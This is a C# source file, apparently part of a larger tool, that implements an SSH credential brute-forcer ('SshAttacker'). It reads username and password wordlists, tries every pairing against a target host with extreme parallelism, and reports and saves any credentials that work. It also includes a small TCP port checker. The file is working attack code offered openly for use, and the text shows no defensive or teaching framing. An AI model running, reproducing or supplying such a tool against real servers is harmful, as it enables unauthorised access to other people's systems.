/*
 *  SSH Server Credentiasl Bruteforcer
 *
 *  Copyright (C) 2021 MishDotCom <mishdotcomdev@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Threading;
using System.Net.Sockets;
using Renci.SshNet;

namespace SshAttacker
{
    class FileParser
    {
        public static string[] ReturnItemlist(string path)
        {
            return File.ReadAllLines(path);
        }
    }

    class Controller
    {
        public static void RunAttack(string host, string[] users, string[] passes)
        {
            Program.SetupAttackEnv(host);
            ParallelOptions po = new ParallelOptions();
            po.MaxDegreeOfParallelism = Environment.ProcessorCount * 10000;
            bool writtenSesion = false;
            Parallel.ForEach(users, po, usr => {
                Parallel.ForEach(passes, po, pass => {
                    using(var sshClient = new SshClient(host.Trim(), usr.Trim(), pass.Trim()))
                    {
                        try
                        {
                            sshClient.Connect();
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"\n\n[+] Credentials found succesfully: [pass : {pass.Trim()}] | [user : {usr.Trim()}]");
                            Console.ForegroundColor = ConsoleColor.White;
                            if(!writtenSesion)
                            {
                                SaveSession.SaveWrittenSession(true, host.Trim(), usr.Trim(), pass.Trim());
                                writtenSesion = true;
                            }
                            Console.ReadLine();
                            Environment.Exit(1);
                        }
                        catch(Exception ex)
                        {
                            Console.WriteLine($"[ATTEMPT] Credentials invalid: [pass : {pass.Trim()}] | [user : {usr.Trim()}]");
                            Console.WriteLine("[VERBOSE] : " + ex.Message);
                        }
                    }
                });
            });
            SaveSession.SaveWrittenSession(false, host, "", "");
        }

        public static void AttemptLogin(string host, string pass, string usr)
        {
            TcpClient client = new TcpClient();
            try
            {
                client.Connect(host, 22);
                Console.WriteLine(client.Connected);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }
    }

    class PortScanner
    {
        public static bool isPortOpen(IPAddress addr, int port)
        {
            using(TcpClient client = new TcpClient())
            {
                try
                {
                    client.Connect(addr, port);
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }
    }
}
